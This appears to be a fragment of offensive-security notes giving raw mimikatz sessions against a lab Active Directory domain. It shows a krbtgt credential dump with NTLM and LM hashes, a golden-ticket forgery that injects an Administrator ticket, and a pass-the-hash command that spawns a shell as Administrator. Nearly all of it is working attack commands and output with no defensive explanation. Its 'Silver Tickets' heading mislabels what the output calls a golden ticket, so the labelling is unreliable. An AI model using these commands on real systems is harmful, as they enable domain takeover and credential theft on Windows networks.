
## Silver Tickets

```
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 22/03/2018 14:49:02
Object Security ID   : S-1-5-21-1516486103-3973840447-1748718438-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9063b8edb3d04ed734edd49e5b0adef3
    ntlm- 0: 9063b8edb3d04ed734edd49e5b0adef3
    lm  - 0: be97fc24cf1ad2cc2d193430d113f45c
    
mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /rc4:9063b8edb3d04ed734edd49e5b0adef3 /ptt
User      : Administrator
Domain    : testlab.local (TESTLAB)
SID       : S-1-5-21-1516486103-3973840447-1748718438
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9063b8edb3d04ed734edd49e5b0adef3 - rc4_hmac_nt
Lifetime  : 22/03/2018 15:36:25 ; 19/03/2028 15:36:25 ; 19/03/2028 15:36:25
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session    
    
```

 ## Pass-the-Hash 
 
 ```
 mimikatz # sekurlsa::pth /user:Administrator /domain:FS01 /rc4:fc525c9683e8fe067095ba2ddc971889 /ptt
user    : Administrator
domain  : FS01
program : cmd.exe
impers. : no
NTLM    : fc525c9683e8fe067095ba2ddc971889
  |  PID  3876
  |  TID  2952
  |  LSA Process is now R/W
  |  LUID 0 ; 691999 (00000000:000a8f1f)
  \_ msv1_0   - data copy @ 00000214BC31C610 : OK !
  \_ kerberos - data copy @ 00000214BC5529B8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -> null
   
 ```
 

